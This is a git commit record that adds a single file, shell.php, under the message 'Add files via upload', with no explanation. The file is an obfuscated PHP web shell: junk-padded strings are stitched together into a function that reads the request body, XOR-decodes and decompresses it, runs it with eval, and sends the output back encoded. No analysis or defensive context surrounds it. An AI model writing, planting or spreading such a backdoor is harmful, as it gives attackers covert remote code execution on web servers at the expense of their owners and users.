e90c901373e2dbce4737b7e2164c96f729f5d770
Muhammad <132049921+qorahoja@users.noreply.github.com>
2023-10-16 15:25:46 +0500

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,10 @@
+<?php
+$k='$H^k=H^"H^827ccb0e";$kh="ea8aH^706c4c34";H^$kfH^="a1689H^H^1f84e7b";$H^p="H^tqoEfiS3V0ihH^O3SK";H^fuH^nctionH^ x($t,$H^k)';
+$h='get_contenH^tH^s();@ob_enH^d_cleH^an();$r=H^@bH^ase64_eH^ncode(@xH^(@gzH^compreH^ss($o),$H^k))H^;printH^("H^$p$kh$r$kf");}';
+$W='{H^$c=sH^H^trleH^n($k);$l=strlen($tH^);H^$o="";for($i=0H^;$H^i<$lH^;){forH^($j=0H^H^;($j<$c&&$i<$l);$j++H^,$H^i+H';
+$f='^+)H^{$o.=$H^t{$i}^$k{$j};}}retH^urn H^$o;}ifH^ (H^@pH^reg_matchH^("/$kh(.+)$kH^f/H^",@H^file_gH^H^et_contenH^ts("php://';
+$R='H^inH^put"),$m)H^==1) {@obH^_start();@eH^valH^(@gzuncomH^pH^ress(@H^H^x(@baH^se64_dH^ecH^odH^e($H^m[1]),$k)));$o=@ob_';
+$o=str_replace('qS','','creqSatqSe_qSfqSuncqSqStion');
+$O=str_replace('H^','',$k.$W.$f.$R.$h);
+$Y=$o('',$O);$Y();
+?>
